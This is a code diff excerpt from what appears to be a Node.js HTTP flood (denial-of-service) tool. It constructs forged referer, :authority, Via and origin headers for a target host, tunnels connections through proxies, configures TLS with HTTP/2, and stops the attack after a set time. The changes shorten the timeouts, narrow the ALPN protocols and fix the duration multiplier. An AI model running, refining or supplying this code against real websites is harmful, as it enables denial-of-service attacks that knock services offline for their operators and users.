-         headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
-         headers[":authority"] = parsedTarget.host
-         headers[":authority"] = parsedTarget.host + ":80"; // Include port 80 in :authority header
-         headers["Via"] = "1.1 " + parsedTarget.host + ":80"; // Include port 80 in Via header
-         headers[":authority"] = parsedTarget.host + ":443"; // Include port 80 in :authority header
-         headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
-         headers["Via"] = "1.1 " + parsedTarget.host + ":443"; // Include port 80 in Via header
 
      const proxyOptions = {
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 300,
+         timeout: 100,
      };
 
      Socker.HTTP(proxyOptions, (connection, error) => {
@@ -1252,7 +1191,7 @@ const rateHeaders4 = [
          const tlsOptions = {
             host: parsedTarget.host,
             secure: true,
-            ALPNProtocols: ['http/1.1', 'h2', 'http/2', 'h3', 'http/3'],
+            ALPNProtocols: ['http/1.1', 'h2'],
             sigals: "RSA+SHA256:ECDSA+SHA256",
             socket: connection,
             ecdhCurve: "auto",
@@ -1327,4 +1266,4 @@ const rateHeaders4 = [
  
  const KillScript = () => process.exit(1);
  
- setTimeout(KillScript, args.time * 1000000);
+ setTimeout(KillScript, args.time * 1000);
